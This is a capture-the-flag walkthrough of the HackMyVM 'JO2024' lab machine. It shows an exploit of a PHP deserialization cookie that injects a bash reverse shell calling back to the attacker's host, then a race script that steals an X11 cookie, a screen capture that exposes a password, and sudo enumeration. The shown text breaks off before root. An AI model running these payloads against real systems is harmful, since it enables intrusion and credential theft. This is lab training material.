# CTF Penetration Testing

## HackMyVM

### JO2024 - Machine

#### Machine Description

- Machine name: [JO2024](https://hackmyvm.eu/machines/machine.php?vm=JO2024)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/jo2024.png" alt="JO2024 Machine Logo" width="150"/>

#### Tools Used

- Burp Suite
- CyberChef
- ffuf
- Gobuster
- LINpeas
- Netcat
- Nikto
- Nmap
- pspy
- pwncat-cs

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.135 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.135`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 05:25 EDT
Nmap scan report for 192.168.56.135
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.61 ((Debian)) ←
MAC Address: 08:00:27:CD:77:69 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.72 seconds
```

`nmap -Pn -sSVC -p80 -T5 192.168.56.135`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 05:29 EDT
Nmap scan report for 192.168.56.135
Host is up (0.00099s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Paris 2024 Olympic Games
MAC Address: 08:00:27:CD:77:69 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
```

`whatweb -v http://192.168.56.135`:
```
WhatWeb report for http://192.168.56.135
Status    : 200 OK
Title     : Paris 2024 Olympic Games
IP        : 192.168.56.135
Country   : RESERVED, ZZ

Summary   : Apache[2.4.61], Bootstrap, HTML5, HTTPServer[Debian Linux][Apache/2.4.61 (Debian)], Script

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.61 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Bootstrap ]
        Bootstrap is an open source toolkit for developing with 
        HTML, CSS, and JS. 

        Website     : https://getbootstrap.com/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.61 (Debian) (from server string)

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 


HTTP Headers:
        HTTP/1.1 200 OK
        Date: Wed, 09 Oct 2024 09:26:16 GMT
        Server: Apache/2.4.61 (Debian)
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 2613
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

`nikto -h http://192.168.56.135`:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.135
+ Target Hostname:    192.168.56.135
+ Target Port:        80
+ Start Time:         2024-10-09 05:26:22 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.61 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /img/: Directory indexing found. ←
+ /img/: This might be interesting.
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-10-09 05:27:24 (GMT-4) (62 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`gobuster dir -u http://192.168.56.135 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 30`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.135
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   500,400,401,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,jpg,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/img                  (Status: 301) [Size: 314] [--> http://192.168.56.135/img/]
/.html                (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 7812]
/preferences.php      (Status: 200) [Size: 3163] ←

[...]
```

`dirsearch -u http://192.168.56.135`:
```
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.56.135/_24-10-09_05-35-20.txt

Target: http://192.168.56.135/

[05:35:20] Starting: 
[05:35:28] 403 -  279B  - /.ht_wsr.txt                                      
[05:35:28] 403 -  279B  - /.htaccess.sample                                 
[05:35:28] 403 -  279B  - /.htaccess.bak1                                   
[05:35:28] 403 -  279B  - /.htaccess.orig                                   
[05:35:28] 403 -  279B  - /.htaccess.save                                   
[05:35:28] 403 -  279B  - /.htaccess_orig                                   
[05:35:28] 403 -  279B  - /.htaccessBAK                                     
[05:35:28] 403 -  279B  - /.htaccess_extra
[05:35:28] 403 -  279B  - /.htaccessOLD2
[05:35:28] 403 -  279B  - /.htaccessOLD                                     
[05:35:28] 403 -  279B  - /.htm                                             
[05:35:28] 403 -  279B  - /.htaccess_sc
[05:35:28] 403 -  279B  - /.htpasswds                                       
[05:35:28] 403 -  279B  - /.httr-oauth
[05:35:28] 403 -  279B  - /.html
[05:35:28] 403 -  279B  - /.htpasswd_test                                   
[05:35:33] 403 -  279B  - /.php                                             
[05:37:00] 301 -  314B  - /img  ->  http://192.168.56.135/img/              
[05:37:49] 403 -  279B  - /server-status/                                   
[05:37:49] 403 -  279B  - /server-status                                    

Task Completed
```

`curl -s "http://192.168.56.135/preferences.php"`:
```html
[...]

<body>
    <div class="container">
        <header>Welcome to Your Personalized Page!</header>
        <div class="content">
                            <div class="message">
                    <p>No user preferences were found or the cookie has expired. Please check your cookie settings or contact the site administrator if the problem persists.</p> ←
                </div>
                    </div>
    </div>
</body>
</html>
```

`curl -I "http://192.168.56.135/preferences.php"`:
```http
HTTP/1.1 200 OK
Date: Wed, 09 Oct 2024 09:39:01 GMT
Server: Apache/2.4.61 (Debian)
Set-Cookie: preferences=TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImZyIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ%3D%3D; expires=Wed, 09 Oct 2024 10:39:01 GMT; Max-Age=3600; path=/ ←
Content-Type: text/html; charset=UTF-8
```

`https://cyberchef.org/#recipe=Magic(3,false,false,'')&input=VHpveE5Ub2lWWE5sY2xCeVpXWmxjbVZ1WTJWeklqb3lPbnR6T2pnNklteGhibWQxWVdkbElqdHpPakk2SW1aeUlqdHpPakUxT2lKaVlXTnJaM0p2ZFc1a1EyOXNiM0lpTzNNNk5Eb2lJMlJrWkNJN2ZRPT0`

`CyberChef Input`:
```
TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImZyIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ==
```

`CyberChef Output`:
```
Recipe:
[From_Base64('A-Za-z0-9+/=',true,false)]

Result snippet:
O:15:"UserPreferences":2:{s:8:"language";s:2:"fr";s:15:"backgroundColor";s:4:"#ddd";} ←

Properties:
Valid UTF8 Entropy: 4.3
```

`echo "TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImZyIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ==" | base64 -d`:
```
O:15:"UserPreferences":2:{s:8:"language";s:2:"fr";s:15:"backgroundColor";s:4:"#ddd";} 
```

<div>
	<img src="./assets/logo_portswigger.png" alt="PortSwigger Logo" width="16" height="auto">
	<span style="color: #ff6633; font-size: 110%;"><strong>PortSwigger</strong></span>
</div>

[Exploiting insecure deserialization vulnerabilities](https://portswigger.net/web-security/deserialization/exploiting)

[**#PHP serialization format**]
PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a `User` object with the attributes:
`$user->name = "carlos"; $user->isLoggedIn = true;`
When serialized, this object may look something like this:
`O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
This can be interpreted as follows:
- `O:4:"User"` - An object with the 4-character class name `"User"`
- `2` - the object has 2 attributes
- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
- `b:1` - The value of the second attribute is the boolean value `true`
The native methods for PHP serialization are `serialize()` and `unserialize()`. If you have source code access, you should start by looking for `unserialize()` anywhere in the code and investigating further.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./fake_cookie.txt`:
```
O:15:"UserPreferences":2:{s:8:"language";s:2:"id";s:15:"backgroundColor";s:4:"#ddd";} ←
```

`cat ./fake_cookies.txt | base64 -w 0`:
```
TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImlkIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQo=
```

`curl -s "http://192.168.56.135/preferences.php" -b "preferences=TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImlkIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQo="`:
```html
[...]

<body>
    <div class="container">
        <header>Welcome to Your Personalized Page!</header>
        <div class="content">
                            <div class="preferences">
                    <p>Your language setting is id.</p>
                    <p>Your background color is #ddd.</p>
                </div>
                    </div>
    </div>
</body>
</html>

uid=33(www-data) gid=33(www-data) groups=33(www-data) ←
```

`echo -n "bash -c 'exec bash -i >& /dev/tcp/192.168.56.118/4444 0>&1'" | wc -c`:
```
59 ←
```

`vim ./revsh_cookie.txt`:
```
O:15:"UserPreferences":2:{s:8:"language";s:59:"bash -c 'exec bash -i >& /dev/tcp/192.168.56.118/4444 0>&1'";s:15:"backgroundColor";s:4:"#ddd";} ←
```

`cat ./revsh_cookie.txt | base64 -w 0`:
```
TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjU5OiJiYXNoIC1jICdleGVjIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMTgvNDQ0NCAwPiYxJyI7czoxNToiYmFja2dyb3VuZENvbG9yIjtzOjQ6IiNkZGQiO30K
```

`pwncat-cs -lp 4444`:
```
[13:13:13] Welcome to pwncat 🐈!
bound to 0.0.0.0:4444 ←
```

`curl -s "http://192.168.56.135/preferences.php" -b "preferences=TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjU5OiJiYXNoIC1jICdleGVjIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMTgvNDQ0NCAwPiYxJyI7czoxNToiYmFja2dyb3VuZENvbG9yIjtzOjQ6IiNkZGQiO30K"`

```
[13:40:40] received connection from 192.168.56.135:58474 ←
[13:40:41] 192.168.56.135:58474: registered new host w/ db
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
www-data ←
```

`id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uname -a`:
```
Linux jo2024.hmv 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm
```

`ls -alps /var/www/html`:
```
total 896
  4 drwxr-xr-x 3 www-data www-data   4096 Jul 29 13:48 ./
  4 drwxr-xr-x 4 root     root       4096 Jul 29 13:48 ../
  4 drwxr-xr-x 2 www-data www-data   4096 Jul 29 13:48 img/
  8 -rw-r--r-- 1 www-data www-data   7812 Jul 29 13:48 index.php
868 -rw-r--r-- 1 www-data www-data 886098 Jul 29 13:48 logo-light.png
  8 -rw-r--r-- 1 www-data www-data   4330 Jul 29 13:48 preferences.php
```

`cat /etc/passwd | grep "/bin/bash"`:
```
root:x:0:0:root:/root:/bin/bash
vanity:x:1000:1000:,,,:/home/vanity:/bin/bash ←
```

`ls -alps /home`:
```
total 12
4 drwxr-xr-x  3 root   root   4096 Jul 28 12:27 ./
4 drwxr-xr-x 19 root   root   4096 Jul 29 16:04 ../
4 drwxr-xr-x 10 vanity vanity 4096 Oct  9 11:26 vanity/ ←
```

`ls -alps /home/vanity`:
```
total 76
4 drwxr-xr-x 10 vanity vanity 4096 Oct  9 11:26 ./
4 drwxr-xr-x  3 root   root   4096 Jul 28 12:27 ../
4 -rw-------  1 vanity vanity  158 Oct  9 11:25 .Xauthority ←
0 lrwxrwxrwx  1 root   root      9 Jul 26 18:04 .bash_history -> /dev/null
4 -rw-r--r--  1 vanity vanity  220 Jul 29 13:48 .bash_logout
4 -rw-r--r--  1 vanity vanity 3526 Jul 29 13:48 .bashrc
4 drwxr-xr-x  7 vanity vanity 4096 Jul 29 13:48 .cache/
4 drwx------ 13 vanity vanity 4096 Jul 29 15:47 .config/
4 -rw-r--r--  1 vanity vanity   35 Jul 29 13:48 .dmrc
4 -rw-------  1 vanity vanity   36 Jul 29 13:48 .lesshst
4 drwxr-xr-x  3 vanity vanity 4096 Jul 29 13:48 .local/
4 -rw-r--r--  1 vanity vanity  807 Jul 29 13:48 .profile
4 drwx------  2 vanity vanity 4096 Jul 29 14:40 .ssh/
4 -rw-r--r--  1 vanity vanity    8 Jul 29 13:48 .xprofile
4 drwxr-xr-x  2 vanity vanity 4096 Jul 29 13:48 Desktop/
4 drwxr-xr-x  2 vanity vanity 4096 Jul 29 13:48 Documents/
4 drwxr-xr-x  2 vanity vanity 4096 Jul 29 13:48 Images/
4 -rwxr-xr-x  1 vanity vanity  557 Jul 29 15:44 backup ←
4 drwx------  2 vanity vanity 4096 Jul 29 13:48 creds/
4 -rwx------  1 vanity vanity   33 Jul 29 13:48 user.txt
```

`cat ./backup`:
```sh
#!/bin/bash

SRC="/home/vanity"
DEST="/backup"

rm -rf /backup/{*,.*}

echo "Starting copy..."
find "$SRC" -maxdepth 1 -type f ! -name user.txt | while read srcfile; do
    destfile="$DEST${srcfile#$SRC}"
    mkdir -p "$(dirname "$destfile")"
    dd if="$srcfile" of="$destfile" bs=4M

    md5src=$(md5sum "$srcfile" | cut -d ' ' -f1)
    md5dest=$(md5sum "$destfile" | cut -d ' ' -f1)
    if [[ "$md5src" != "$md5dest" ]]; then
        echo "MD5 mismatch for $srcfile :("
    fi
    chmod 700 "$destfile"

done


echo "Copy complete. All files verified !"
```

`ls -l /backup`:
```
total 4
-rwx------ 1 vanity vanity 557 Oct  9 16:49 backup ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[6000 - Pentesting X11](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11)

[**#Local Enumeration**]
The file `**.Xauthority**` in the users home folder is **used** by **X11 for authorization**.
From [**here**](https://stackoverflow.com/a/37367518):
```
$ xxd ~/.Xauthority
00000000: 0100 0006 6d61 6e65 7063 0001 3000 124d  ............0..M
00000010: 4954 2d4d 4147 4943 2d43 4f4f 4b49 452d  IT-MAGIC-COOKIE-
00000020: 3100 108f 52b9 7ea8 f041 c49b 85d8 8f58  1...R.~..A.....X
00000030: 041d ef                                  ...
```
> MIT-magic-cookie-1: Generating 128bit of key (“cookie”), storing it in ~/.Xauthority (or where XAUTHORITY envvar points to). The client sends it to server plain! the server checks whether it has a copy of this “cookie” and if so, the connection is permitted. the key is generated by DMX.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`upload /home/kali/tools/linpeas.sh /var/www/html/linpeas.sh`:
```
/var/www/html/linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.3/860.3 KB • ? • 0:00:00
[16:59:14] uploaded 860.34KiB in 0.67 seconds ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`cd /var/www/html`

`chmod u+x ./linpeas.sh`

`./linpeas.sh > ./linpeas_output.txt`

`cat -n ./linpeas_output.txt`:
```
[...]

   688
   689  ╔══════════╣ Login now
   690   17:04:07 up  5:39,  3 users,  load average: 0.48, 0.17, 0.05
   691  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
   692  vanity   tty7     :0               11:25    5:39m  0.00s  0.09s /usr/bin/lxsession -s LXDE -e LXDE ←
   693  vanity   pts/1    192.168.56.118   14:56    2:07m  0.02s  0.02s -bash
   694  vanity   pts/2    -                15:03    2:00m  1.44s   ?    sudo /usr/local/bin/php-server.sh

[...]

  1076  ══╣ Parent process capabilities

[...]

  1084  Files with capabilities (limited to 50):
  1085  /usr/bin/slock cap_dac_override,cap_sys_resource=ep ←
  1086  /usr/bin/ping cap_net_raw=ep
  1087  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep

[...]
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

[**#CAP_DAC_OVERRIDE**]

**This mean that you can bypass write permission checks on any file, so you can write any file.**

There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#overwriting-a-file-to-escalate-privileges).

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`upload /home/kali/tools/pspy64 /var/www/html/pspy64`:
```
/var/www/html/pspy64 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 3.1/3.1 MB • 2.8 MB/s • 0:00:00
[17:05:00] uploaded 3.10MiB in 1.48 seconds ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`chmod u+x ./pspy64`

`./pspy64 > ./pspy64_output.txt`

`cat -n ./pspy64_output.txt`:
```
[...]

   275  2024/10/09 17:17:02 CMD: UID=1000  PID=50518  | /bin/bash /home/vanity/backup ←

[...]
```

`vim ./race.sh`:
```sh
#!/bin/bash  

while true; do 
	cp /backup/.Xauthority /tmp/magic_cookie.txt 2> /dev/null
	[[ $? -eq 0 ]] && echo "OK" && exit 0 
done
```

`chmod u+x ./race.sh`

`./race.sh`:
```
OK ←
```

`file /tmp/.Xauthority`:
```
/tmp/.Xauthority: X11 Xauthority data ←
```

`cat /tmp/.Xauthority`:
```
debian11MIT-MAGIC-COOKIE-1�>7�
�EXJ[���f�debian0MIT-MAGIC-COOKIE-1������m�lJ���

jo2024.hmv0MIT-MAGIC-COOKIE-1!x����I�����޾
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[6000 - Pentesting X11](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11)

In order to **use the cookie** you should set the env var: `**export XAUTHORITY=/path/to/.Xauthority**`

[**#Verfy Connection**]
```
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```

[**#Screenshots capturing**]
```
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`w`:
```
 17:19:51 up  5:54,  1 user,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vanity   tty7     :0               11:25    5:54m  0.00s  0.09s /usr/bin/lxsession -s LXDE -e LXDE ←
```

`export XAUTHORITY=/tmp/.Xauthority`

`xdpyinfo -display :0`:
```        
[...]

  visual:
    visual id:    0x53c
    class:    TrueColor
    depth:    32 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
```

`xwd -root -screen -silent -display :0 > ./screenshot.xwd`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`download /tmp/screenshot.xwd /home/kali/screenshot.xwd`:
```
/tmp/screenshot.xwd ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 3.1/3.1 MB • 5.0 MB/s • 0:00:00
[18:56:36] downloaded 3.15MiB in 0.85 seconds ←
```

`cd /home/kali`

`convert ./screenshot.xwd ./screenshot.png`

```
vanity:xd0oITR93KIQDbiD ←
```

`su vanity`:
```
Password: ←
```

![Victim: vanity](https://img.shields.io/badge/Victim-vanity-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
vanity ←
```

`id`:
```
uid=1000(vanity) gid=1000(vanity) groups=1000(vanity),100(users)
```

`cd /home/vanity`

`ls -alps ./`:
```
total 76
4 drwxr-xr-x 10 vanity vanity 4096 Oct  9 11:26 ./
4 drwxr-xr-x  3 root   root   4096 Jul 28 12:27 ../
4 -rwxr-xr-x  1 vanity vanity  557 Jul 29 15:44 backup
0 lrwxrwxrwx  1 root   root      9 Jul 26 18:04 .bash_history -> /dev/null
4 -rw-r--r--  1 vanity vanity  220 Jul 29 13:48 .bash_logout
4 -rw-r--r--  1 vanity vanity 3526 Jul 29 13:48 .bashrc
4 drwxr-xr-x  7 vanity vanity 4096 Jul 29 13:48 .cache/
4 drwx------ 13 vanity vanity 4096 Jul 29 15:47 .config/
4 drwx------  2 vanity vanity 4096 Jul 29 13:48 creds/
4 drwxr-xr-x  2 vanity vanity 4096 Jul 29 13:48 Desktop/
4 -rw-r--r--  1 vanity vanity   35 Jul 29 13:48 .dmrc
4 drwxr-xr-x  2 vanity vanity 4096 Jul 29 13:48 Documents/
4 drwxr-xr-x  2 vanity vanity 4096 Jul 29 13:48 Images/
4 -rw-------  1 vanity vanity   36 Jul 29 13:48 .lesshst
4 drwxr-xr-x  3 vanity vanity 4096 Jul 29 13:48 .local/
4 -rw-r--r--  1 vanity vanity  807 Jul 29 13:48 .profile
4 drwx------  2 vanity vanity 4096 Jul 29 14:40 .ssh/
4 -rwx------  1 vanity vanity   33 Jul 29 13:48 user.txt ←
4 -rw-------  1 vanity vanity  158 Oct  9 11:25 .Xauthority
4 -rw-r--r--  1 vanity vanity    8 Jul 29 13:48 .xprofile
```

`cat ./user.txt`:
```
e2cb9d6e0899cde91130ca4b37139021 ←
```

`sudo -l`:
```
Matching Defaults entries for vanity on jo2024:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vanity may run the following commands on jo2024:
    (ALL : ALL) NOPASSWD: /usr/local/bin/php-server.sh ←
```

`ls -l /usr/local/bin/php-server.sh`:
```
-rwxr-xr-x 1 root root 50 Jul 29 13:02 /usr/local/bin/php-server.sh ←
```

`file /usr/local/bin/php-server.sh`:
```
/usr/local/bin/php-server.sh: Bourne-Again shell script, ASCII text executable
vanity@jo2024:~$ cat /usr/local/bin/php-server.sh
```

`cat /usr/local/bin/php-server.sh`:
```
#!/bin/bash

/usr/bin/php -t /opt -S 0.0.0.0:8000 ←
```

`ls -alps /opt`:
```
ls: cannot open directory '/opt': Permission denied
```

`ls -ld /opt`:
```
drwx------ 2 root root 4096 Jul 29 14:14 /opt
```

`ss -tunlp`:
```
Netid              State               Recv-Q              Send-Q                            Local Address:Port                           Peer Address:Port             Process              

[...]

tcp                LISTEN              0                   4096                                    0.0.0.0:8000                                0.0.0.0:*
tcp                LISTEN              0                   10                                 127.0.0.1%lo:53                                  0.0.0.0:*
tcp                LISTEN              0                   128                                     0.0.0.0:22                                  0.0.0.0:*
tcp                LISTEN              0                   511                                           *:80                                        *:*
tcp                LISTEN              0                   128                                        [::]:22                                     [::]:*
tcp                LISTEN              0                   10                                     [::1]%lo:53                                     [::]:*
```

`sudo /usr/local/bin/php-server.sh &`:
```
[1] 21694
[Wed Oct  9 15:03:49 2024] PHP 8.2.20 Development Server (http://0.0.0.0:8000) started ←
```

`ss -tnlp '( sport = :8000 )'`:
```
State                 Recv-Q                Send-Q                                Local Address:Port                                 Peer Address:Port                Process                
LISTEN                0                     4096                                        0.0.0.0:8000 ←                                     0.0.0.0:*
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nmap -Pn -sSV -p8000 -T5 192.168.56.135`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 15:09 CEST
Nmap scan report for 192.168.56.135
Host is up (0.0011s latency).

PORT     STATE SERVICE VERSION
8000/tcp open  http    PHP cli server 5.5 or later (PHP 8.2.20)
MAC Address: 08:00:27:CD:77:69 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
```

`curl -s http://192.168.56.135:8000`:
```html
[...]

<body>
    <div class="container">
        <h1>Olympic Athlete Password Leaked!</h1> ←
        <p>A hacker claims to have obtained the password of a famous Olympic athlete. According to the hacker, he managed to hack into the personal account of the famous sprinter, <strong>Usain Bolt</strong>!</p>
